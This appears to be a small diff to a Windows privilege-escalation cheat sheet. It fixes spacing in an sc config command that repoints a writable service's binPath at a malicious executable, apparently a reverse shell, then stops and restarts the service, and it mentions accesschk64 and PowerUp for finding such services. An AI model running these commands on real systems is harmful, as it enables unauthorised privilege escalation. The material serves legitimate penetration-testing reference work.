@@ -720,7 +720,7 @@ With [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerU
 
 Similar to a previous one, check with `accesschk64.exe -uwcv Everyone *` if you have RW permission on some service. You can query a specific one to get more details with `accesschk64.exe -uwcv $SERVICE`. You can then reconfigure service and supply malicious executable as parameter :
 ```
-sc config $SERVICE binPath= "c:\path\rev.exe"
+sc config $SERVICE binPath="c:\path\rev.exe"
 net stop $SERVICE
 net start $SERVICE
 ```
